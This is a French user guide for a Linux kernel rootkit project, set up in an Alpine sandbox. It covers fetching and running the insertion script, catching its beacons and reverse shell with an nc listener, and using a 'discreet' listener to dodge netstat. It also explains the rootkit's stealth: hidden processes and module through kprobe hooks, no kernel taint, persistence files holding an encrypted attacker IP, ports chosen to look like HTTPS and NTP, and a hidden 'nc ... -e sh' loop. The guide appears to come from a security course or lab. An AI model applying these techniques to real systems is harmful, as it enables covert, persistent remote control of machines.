# Documentation Utilisateur

## Mise en place d’une sandbox alpine LFS

Exécuter le script de lancement de l’Alpine LFS :

```c
./script_generate_alpine_LFS.sh
```

Une version plus rapide de ce script fonctionnant avec l’image disk.qcow2 :

```c
./script_alpine_qcow2.sh
```

Se connecter à l’alpine avec les credentials `root:root`

## Insertion du rootkit

Récupérer le script d’insertion et l’exécuter dans l’alpine

```c
wget https://raw.githubusercontent.com/gobelinor/Rootkit-Project/refs/heads/main/mesmodules/insert/insertion_script
chmod +x insertion_script
./insertion_script
```

Depuis la machine hôte 

```c
ip a
```

Renseigner l'IP de l'hôte au script d’insertion

## Interaction depuis la machine hôte

 

Un des processus de ce rootkit va envoyer un paquet réseau toutes les 30s.

Depuis la machine hôte on peut lancer un serveur python pour observer des logs provoqués par le rootkit :

```c
sudo python3 -m http.server 123
```

A l’insertion du module, on a : 

```c
"GET /START HTTP/1.1" 404 -
```

Toutes les 30s on a :

```c
"GET /UP HTTP/1.1" 404 -
```

Si un utilisateur sur l’alpine cherche à voir le processus qui déclenche ces logs, avec par exemple `ps`, `top`, ou un `ls` dans `/proc` le processus est kill puis relancé et on voit ce log : 

```c
"GET /RESTARTED_BECAUSE_SOMETHING_KILLED_ME HTTP/1.1" 404 -
```

Un processus du rootkit essaye d’établir un reverse shell toutes les 30s.

Depuis la machine hôte il est possible de lancer un reverse shell avec ce listener :

```c
sudo nc -lvnp 443
```

Attention lorsque la connection reverse shell est établie elle est visible via netstat depuis l’alpine, c’est pourquoi il est fourni un script python qui permet de kill la connection instantanément après avoir reçu une réponse de l’alpine.

```c
sudo python3 listener_discret.py "whoami"
```

L’utilisation de ce script python permet d’exécuter une commande sur l’alpine et de grandement diminuer les chances de se faire détecter par un netstat depuis l’alpine par rapport à la solution avec un listener classique de reverse shell. 

Il est possible de redémarrer l’alpine et le rootkit sera toujours en fonctionnement : 

```c
reboot
```

Le reboot peut prendre quelques minutes.

Il est possible de se connecter à un utilisateur qui n’a pas les droits root sur l’alpine.

Les credentials : `user:password`

## Remarques et points d’attention

Lorsque le module est inséré, vous pouvez remarquer que : 

- pas de trace dans l’historique des commandes du user root de l’insertion
- pas de log kernel “loading out of tree module taints the kernel”
- le kernel n’est pas tainted

```c
cat /proc/sys/kernel/tainted
0
```

- les processus réseaux initiés par le rootkit ne sont pas visible depuis l’alpine par un `ps` un `top` un `htop` ou plus généralement un parcours de `/proc`
- le module n’est pas visible avec `lsmod` et n’apparait pas dans `/proc/modules`

Néanmoins il est visible que :

- des kprobes sont enregistrées (visible uniquement par le user root)

```c
cbe2a877a075:~# cat /sys/kernel/debug/kprobes/list 
ffffffffad090094  k  __x64_sys_exit_group+0x4    [OPTIMIZED]
ffffffffad2b8674  k  __x64_sys_getdents64+0x4    [OPTIMIZED]
```

- Un kworker lié à notre rootkit est visible avec `ps`

```c
  626 root      0:00 [kworker/R-nfsio]
```

- les fichiers suivants, permettant la persistance de notre rootkit après un redémarrage (`reboot`), sont visibles par tous les users et peuvent permettre de compromettre notre rootkit et l’IP de l’attaquant

```c
cbe2a877a075:~# cat /etc/modules
af_packet
ipv6
ipv4
```

```c
cbe2a877a075:~# ls /lib/modules/6.10.10/extra/
ipv4.ko
```

```c
cbe2a877a075:~# cat /etc/modprobe.d/ipv4.conf 
options ipv4 param=OGLPOHFPGKPOIN
```

Le paramètre param au dessus contient l’IP renseignée lors de l’insertion du script, mais chiffrée pour éviter de compromettre trop rapidement l’IP de l’attaquant.

Un user n’ayant pas les droits root ne pourra néanmoins pas éditer ou supprimer ces fichiers pour empêcher notre persistance.

- Il est possible pour le user root de désactiver les kprobes avec :

```c
cbe2a877a075:~# echo 0 > /sys/kernel/debug/kprobes/enabled 
```

Ce qui désactive l’obfuscation de nos process.

Par exemple avec `ps` on voit désormais :

```c
  571 root      0:00 /bin/sh -c while true; do nc 192.168.95.170 443 -e sh; sle
  572 root      0:00 /bin/sh -c while true; do wget http://192.168.95.170:123/U
```

Un user n’ayant pas les droits root ne peut pas désactiver les kprobes.

- les ports de destinations ont été choisis pour paraître habituels :
    - 443 pour le reverse shell (correspond habituellement au HTTPS)
    - 123 pour les paquets réseaux envoyés avec wget (correspond habituellement avec NTP)

- Dans le cas ou la persistance n’est pas nécessaire (sur un serveur n’ayant pas à être reboot), comme elle implique d’être facilement détectable à cause des 3 fichiers listés précédemment (`/etc/modules`,`/lib/modules/$(uname -r)/extra/ipv4.ko`, `/etc/modprobe.d/ipv4.conf`) il existe un script d’insertion alternatif sans la persistance `insertion_script_without_persistence`

```c
wget https://raw.githubusercontent.com/gobelinor/Rootkit-Project/refs/heads/main/mesmodules/insert/insertion_script_without_persistence
chmod +x insertion_script
./insertion_script
```

L'utilisation de ce script ne permettra pas à notre rootkit d'être encore chargé après le redémarrage, mais les 3 fichiers compromettants n'existeront plus ou ne contiendront plus de traces de notre module.
